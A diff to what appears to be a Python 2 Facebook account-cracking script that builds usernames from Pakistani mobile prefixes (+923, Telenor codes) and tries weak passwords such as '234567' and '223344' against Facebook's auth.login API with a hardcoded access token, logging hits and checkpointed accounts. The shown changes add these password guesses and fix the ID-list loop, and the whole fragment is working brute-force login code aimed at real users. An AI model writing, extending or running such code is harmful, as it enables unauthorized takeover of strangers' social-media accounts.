@@ -138,7 +138,7 @@ def action():
 			c = raw_input(" SELECTED CODE: ")
 			k="+923"
 			idlist = ('.txt')
-			.readlines():
+			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
 		except IOError:
 			print ("[!] File Not Found")
@@ -149,7 +149,7 @@ def action():
 		print (logo)
 		print "\033[1;91mTELINORE CODE HERE"		
 		print "\033[1;94m40, 41, 42, 43, 44,"
-		print "\033[1;95m45, 64, ??, ??, ??,"
+		print "\033[1;95m45, 45, 46, 47, 48,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
 			k="+923"
@@ -266,7 +266,7 @@ def action():
 					cps.close()
 					cpb.append(c+user+pass1)
 				else:	
-					
+					pass2 = '234567'
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                q = json.load(data)
 					if 'access_token' in q:
@@ -283,7 +283,7 @@ def action():
 							cps.close()
 							cpb.append(c+user+pass2)
 						else:	
-							
+							pass3 = '223344'
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                                q = json.load(data)
 							if 'access_' in q:
